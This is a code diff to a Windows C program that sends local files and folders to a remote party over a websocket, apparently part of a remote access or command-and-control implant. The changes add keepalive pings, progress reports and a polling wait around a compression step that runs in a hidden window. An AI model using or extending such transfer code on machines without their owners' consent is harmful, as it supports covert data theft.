@@ -1485,6 +1485,8 @@ int download_file(const char* filename) {
     long long total_sent = 0;
     int chunk_count = 0;
     int transfer_failed = 0;
+    DWORD last_ping = GetTickCount();
+    DWORD last_progress = GetTickCount();
     
     while (!feof(file) && g_connected && !transfer_failed) {
         size_t bytes_read = fread(read_buffer, 1, sizeof(read_buffer), file);
@@ -1504,10 +1506,25 @@ int download_file(const char* filename) {
         total_sent += bytes_read;
         chunk_count++;
         
-        // Delay every 16 chunks (~48KB) to prevent buffer overflow
-        if (chunk_count % 16 == 0) {
-            Sleep(50);
+        // Send ping every 5 seconds to keep connection alive during large transfers
+        DWORD now = GetTickCount();
+        if (now - last_ping > 5000) {
             send_websocket_ping();
+            last_ping = now;
+        }
+        
+        // Show progress every 10 seconds for large files
+        if (size > 10000000 && (now - last_progress > 10000)) {
+            char progress_msg[128];
+            int percent = (int)((total_sent * 100) / size);
+            sprintf(progress_msg, "[*] Progress: %d%% (%lld / %lld bytes)\n", percent, total_sent, size);
+            send_websocket_data(progress_msg, strlen(progress_msg));
+            last_progress = now;
+        }
+        
+        // Small delay every 8 chunks (~24KB) to prevent buffer overflow
+        if (chunk_count % 8 == 0) {
+            Sleep(30);
         }
     }
     
@@ -1785,7 +1802,28 @@ void download_folder(const char* foldername) {
     ZeroMemory(&pi, sizeof(pi));
     
     if (CreateProcessA(NULL, ps_cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
-        WaitForSingleObject(pi.hProcess, 300000);  // Wait up to 5 min
+        // Wait for compression with periodic pings to keep connection alive
+        DWORD wait_result;
+        DWORD last_ping = GetTickCount();
+        int dots = 0;
+        
+        while ((wait_result = WaitForSingleObject(pi.hProcess, 3000)) == WAIT_TIMEOUT) {
+            // Send ping every 3 seconds during compression
+            send_websocket_ping();
+            dots++;
+            if (dots % 10 == 0) {
+                send_websocket_data("[*] Still compressing...\n", 25);
+            }
+            
+            // Timeout after 5 minutes
+            if (GetTickCount() - last_ping > 300000) {
+                TerminateProcess(pi.hProcess, 1);
+                send_websocket_data("[!] Compression timed out\n", 26);
+                CloseHandle(pi.hProcess);
+                CloseHandle(pi.hThread);
+                return;
+            }
+        }
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
     }
